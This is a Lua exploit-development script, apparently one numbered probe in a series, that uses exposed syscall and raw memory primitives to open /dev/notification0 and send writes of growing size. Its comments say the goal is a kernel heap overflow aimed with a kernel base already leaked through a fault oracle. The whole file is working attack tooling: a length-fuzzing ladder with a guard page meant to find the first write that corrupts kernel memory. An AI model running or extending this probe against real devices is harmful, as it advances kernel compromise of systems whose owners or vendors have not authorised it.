-- CRASH_CLASS: HIGH
-- PROBE 1067a: does /dev/notification0 write() bound the length it copies?
-- 1038a found exactly one device that accepted bytes: /dev/notification0, write(64) = 64.
-- Everything else answered -1.  A device that takes a user buffer and returns the full
-- length either copies into a matching allocation or into a fixed kernel buffer.  If the
-- second, a longer write is a kernel heap overflow, and we already know the kernel base
-- this boot from the fault oracle, so an overflow would be aimed rather than blind.
-- Ladder is ascending and prints before each write, so the last line printed names the
-- first length that died.
print("=== PROBE 1067a: /dev/notification0 write length ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function as_addr(x) local m=tostring(x):match("0x(%x+)"); if m then return tonumber(m,16) end return to_num(x) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return to_num(v) end return -1 end
local function rdw(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return -1 end

local sc_open,sc_write,sc_read,sc_close,sc_pid = mk(5),mk(4),mk(3),mk(6),mk(20)
local function pid() return to_num(select(2,pcall(function() return sc_pid() end))) end
print(string.format("[S] pid=%d", pid()))

local pb=memory.alloc(0x80); local pa=as_addr(pb)
local name="/dev/notification0"
for i=0,0x40 do wd(pa+i,0) end
for i=1,#name do wd(pa+i-1,name:byte(i)) end

local BIG=0x100000
local buf=memory.alloc(BIG+0x100); local ba=as_addr(buf)
local watch=memory.alloc(0x1000); local wa=as_addr(watch)
print(string.format("[A] buf=%X watch=%X", ba, wa))
if ba==0 or wa==0 then print("[!] alloc failed"); return end
for i=0,BIG/8-1 do pcall(function() memory.write_qword(uint64(ba+i*8),uint64(0x4141414141414141)) end) end
for i=0,0x1000/4-1 do pcall(function() memory.write_dword(uint64(wa+i*4),uint64(0xAAAAAAAA)) end) end
if rdw(wa) ~= 0xAAAAAAAA or rdw(wa+0xFFC) ~= 0xAAAAAAAA then print("[!] watch not armed"); return end

local function open_dev()
  local ok,fd=pcall(function() return sc_open(uint64(pa),uint64(5),uint64(0)) end)  -- O_WRONLY|O_NONBLOCK
  if ok and to_num(fd)>=0 then return to_num(fd) end
  local ok2,fd2=pcall(function() return sc_open(uint64(pa),uint64(4),uint64(0)) end)
  if ok2 and to_num(fd2)>=0 then return to_num(fd2) end
  return -1
end

local fd=open_dev()
print(string.format("[O] fd=%d", fd))
if fd<0 then print("[!] open failed"); return end

-- 1038a's known-good length first, then ascend.  Each rung re-checks the fd so a closed
-- or destroyed fd is visible rather than inferred.
local lens={64,128,256,512,1024,4096,16384,65536,0x40000,BIG}
for _,n in ipairs(lens) do
  print(string.format(">w%d", n))
  local ok,w=pcall(function() return sc_write(uint64(fd),uint64(ba),uint64(n)) end)
  local r = ok and to_num(w) or -999
  local w0=rdw(wa)
  print(string.format("[W] len=%d rv=%d watch0=%X alive_pid=%d", n, r, w0, pid()))
  if r==-999 then print("[!] write raised; stopping"); break end
  if w0 ~= 0xAAAAAAAA then print("[!] watch page changed at len="..n); break end
end
pcall(function() return sc_close(uint64(fd)) end)
print("[Z] done pid="..pid())
